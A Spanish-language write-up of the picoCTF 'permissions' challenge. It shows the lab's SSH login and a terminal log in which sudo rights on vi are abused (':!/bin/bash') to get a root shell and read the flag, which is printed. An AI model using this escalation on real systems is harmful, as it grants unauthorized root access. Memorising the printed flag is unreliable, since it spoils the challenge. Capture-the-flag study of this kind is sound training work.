# permissions

## Descripción
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 59622 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?

## Solución
```
VictorCervantes-picoctf@webshell:~$ ssh -p 59622 picoplayer@saturn.picoctf.net

picoplayer@saturn.picoctf.net's password: 

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ 
Display all 650 possibilities? (y or n)
picoplayer@challenge:~$ sudo vi prueba
```

Dentro del archivo 'vi', ejecutamos el codigo ":!/bin/bash" para abrir una nueva terminal (bash) pero ahora con privilegios de administrador (root).
```
root@challenge:/home/picoplayer# cd /
root@challenge:/# ls -la
total 0
drwxr-xr-x   1 root   root     63 Feb 21 00:59 .
drwxr-xr-x   1 root   root     63 Feb 21 00:59 ..
-rwxr-xr-x   1 root   root      0 Feb 21 00:59 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 21 00:59 dev
drwxr-xr-x   1 root   root     66 Feb 21 00:59 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 247 nobody nogroup   0 Feb 21 00:59 proc
drwx------   1 root   root     22 Feb 21 01:04 root
drwxr-xr-x   1 root   root     66 Feb 21 01:00 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 21 00:59 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
root@challenge:/# cd root/
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Feb 21 01:04 .
drwxr-xr-x 1 root root   63 Feb 21 00:59 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  961 Feb 21 01:04 .viminfo
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
root@challenge:~# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
VictorCervantes-picoctf@webshell:~$ 

```
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
## Notas adicionales
- 'sudo -l' permite ver que permisos de sudo tiene el usuario, para ver que puede ejecutar con sudo.
- 'sudo vi file' permite abrir o crear un archivo con el editor 'vi' pero con privilegios de administrador (root).

## Referencias
- 